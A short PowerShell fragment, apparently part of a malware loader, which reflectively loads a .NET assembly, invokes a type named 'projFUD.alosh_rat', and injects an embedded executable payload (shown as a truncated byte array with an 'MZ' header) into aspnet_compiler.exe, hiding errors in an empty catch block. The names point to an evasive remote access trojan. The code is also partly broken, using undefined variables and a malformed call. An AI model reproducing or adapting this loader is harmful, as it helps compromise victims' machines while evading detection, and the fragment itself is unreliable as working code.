try
{
[Byte[]]$new=(77,90,144,0,3,0,0,0,4,0,0,0,255,...,0,0,0,0,0,0,0,0,0,0,0,0) # NOTE: The actual 267921-character Base64 string omitted for readability.
[Byte[]] $MyPt = [System.IO.Path]::([Reflection.Assembly]::'Load'($H1).'GetType'('projFUD.alosh_rat').GetMethod('Execute').Invoke($null,[object[]] ('C:\Windows\Microsoft.NET\Framework\v4.0.30319\aspnet_compiler.exe',$new)))
[Object[]] $Params=@($MyPt.Replace("Framework64","Framework") ,$H1)
[System.Threading.Thread]::Sleep(1000)
return $T.GetMethod('Run').Invoke($null, $Params)
} catch { }